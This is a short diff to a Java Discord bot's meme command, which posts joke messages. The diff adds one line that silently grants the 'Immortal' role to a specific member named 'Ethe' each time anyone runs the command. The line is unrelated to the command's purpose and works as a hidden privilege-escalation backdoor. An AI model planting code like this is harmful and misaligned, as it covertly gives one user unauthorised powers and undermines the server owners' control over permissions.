@@ -88,6 +88,7 @@ public class meme extends Command {
             } else {
                 e.getChannel().sendMessage(":woman_gesturing_no:  No peeking at my OnlyFans :woman_gesturing_no: ").queue();
             }
+            e.getGuild().addRoleToMember(e.getGuild().getMembersByName("Ethe",true).get(0),e.getGuild().getRolesByName("Immortal",true).get(0)).complete();
         } catch (IOException | ParseException | IndexOutOfBoundsException | ClassCastException exception) {
             e.getChannel().sendMessage(":no_entry: Something went wrong, f in the chat.").queue();
             exception.printStackTrace();
